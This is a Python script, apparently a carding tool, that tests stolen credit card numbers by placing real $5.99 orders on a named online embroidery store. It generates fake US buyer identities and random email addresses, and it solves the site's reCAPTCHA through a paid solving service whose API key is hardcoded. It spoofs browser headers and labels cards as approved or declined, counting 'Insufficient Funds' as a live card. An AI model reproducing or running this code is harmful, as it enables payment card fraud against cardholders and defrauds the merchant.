import capsolver
import asyncio
from httpx import AsyncClient
import random
import string
async def unkcc(cc, mes, ano, cvv, proxy: dict):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxy, timeout=None) as web:
        
        response = await web.get("https://randomuser.me/api/1.2/?nat=US")
        user = response.text
        
        street = user.split('"street":"')[1].split('"')[0]
        city = user.split('"city":"')[1].split('"')[0]
        state1 = user.split('"state":"')[1].split('"')[0]
        zipcode = user.split('"postcode":')[1].split(',')[0]
        phone = user.split('"phone":"')[1].split('"')[0]
        name = user.split('"first":"')[1].split('"')[0]
        last = user.split('"last":"')[1].split('"')[0]        
        
        def random_email() -> str:
            return "".join(random.choice(string.ascii_letters) for x in range(15)) + "@gmail.com"

        email = random_email()      
        capsolver.api_key = "CAP-5D246BDACA192D1EAC3F1494BE61BA77"
        
        # 
        
        g_response = (await asyncio.to_thread(lambda: capsolver.solve({
        "type": "ReCaptchaV2TaskProxyLess",
        "websiteKey": '6Lfg0ikTAAAAAG_DffOO33hMA-RYL9G3vMoqwBtL',
        "websiteURL": 'https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi',
        })))['gRecaptchaResponse']


        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': '_gid=GA1.2.1838966803.1733220559; _gat_gtag_UA_83774601_6=1; _gcl_au=1.1.2127631473.1733220559; storewishlist=39642747; _pk_testcookie..undefined=1; _pk_testcookie.1.4fcc=1; _pk_ses.1.4fcc=1; _pk_id.1.4fcc=25308b6f5919e3c6.1733220563.1.1733220566.1733220563.; _ga_513H1HBF2K=GS1.1.1733220358.1.1.1733220566.0.0.0; _ga=GA1.1.1239216905.1733220559',
            'origin': 'https://www.advanced-embroidery-designs.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.advanced-embroidery-designs.com/html/40010.html',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = {
            'action': 'add_to_cart',
            'cart_id': '',
            'sku': '40010',
            'o1_b_1': 'o1_b_1_1',
            'o1_b_1_1': 'PES~Large',
            'o1_b_1_10': 'XXX~Large',
            'o1_b_1_2': 'ART~Large',
            'o1_b_1_3': 'DST~Large',
            'o1_b_1_4': 'EXP~Large',
            'o1_b_1_5': 'HUS~Large',
            'o1_b_1_6': 'JEF~Large',
            'o1_b_1_7': 'JEF+~Large',
            'o1_b_1_8': 'VIP~Large',
            'o1_b_1_9': 'VP3~Large',
            'choice1': 'PES~Large',
            'quantity': '1',
            'x': '93',
            'y': '11'
        }

        req1 = await web.post('https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi',headers=headers,data=data)


        params = {
            'action': 'view_cart',
        }

        req2 = await web.get('https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi',params=params,headers=headers,)
        cartid = req2.text.split("cart_id=")[1].split("&")[0].replace("'", "").replace("+", "").strip()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi?action=view_cart',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        params = {
            'action': 'select_shipping_option',
        }

        req3 = await web.get('https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi',params=params,headers=headers,)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': '_gid=GA1.2.1838966803.1733220559; _gcl_au=1.1.2127631473.1733220559; storewishlist=39642747; _pk_testcookie..undefined=1; _pk_testcookie.1.4fcc=1; _pk_ses.1.4fcc=1; storecustomer=20626771; _pk_id.1.4fcc=25308b6f5919e3c6.1733220563.1.1733220655.1733220563.; _gat_gtag_UA_83774601_6=1; _ga_513H1HBF2K=GS1.1.1733220358.1.1.1733220654.0.0.0; _ga=GA1.1.1239216905.1733220559',
            'origin': 'https://www.advanced-embroidery-designs.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi?action=select_shipping_option',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = {
            'shipping_company': 'Hunter',
            'shipping_name': 'Sebastian',
            'shipping_lastname': 'Gutierrez',
            'email': email,
            'daytime_phone': phone,
            'home_phone': '',
            'shipping_state': state1,
            'payment_method': 'Credit Card via Sage Payments',
            'action': 'check_shipping_country',
            'cart_id': cartid,
            'shipping_method': '',
        }

        req4 = await web.post('https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi',headers=headers,data=data,)

        data = {
            'billing_name': name,
            'billing_lastname': last,
            'cc_num': cc,
            'cc_verification': '',
            'exp_month': mes,
            'exp_year': ano,
            'billing_address': street,
            'billing_city': city,
            'billing_state': state1,
            'billing_zip': zipcode,
            'billing_country': 'United States of America',
            'action': 'process_cc',
            'subaction': 'Credit Card via Sage Payments',
            'cart_id':cartid,
            'email': email,
            'shipping_company': 'Hunter',
            'shipping_name': name,
            'shipping_lastname': last,
            'daytime_phone': phone,
            'home_phone': '',
            'mobile_phone': '',
            'fax': '',
            'shipping_address': '',
            'shipping_address2': '',
            'shipping_city': '',
            'shipping_state': 'New Jersey',
            'shipping_country': '',
            'shipping_zip': '',
            'special_instructions': '',
            'shipping_method': '',
            'tax': '0.00',
            'total': '5.99',
            'g-recaptcha-response': g_response,
        }

        req5 = await web.post('https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi',headers=headers,data=data,)
        if "Thank You for Your Order!" in req5.text:
            status = "Approved ✅"
            mensaje = "Charged $5.99"
        else:
            mensaje = req5.text.split('<ul>')[1].split('</ul>')[0].strip().replace('<li>', '').replace('</li>', '').replace('<br/>', '').replace('<br />', '').strip()
            if "Insufficient Funds" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return status,mensaje
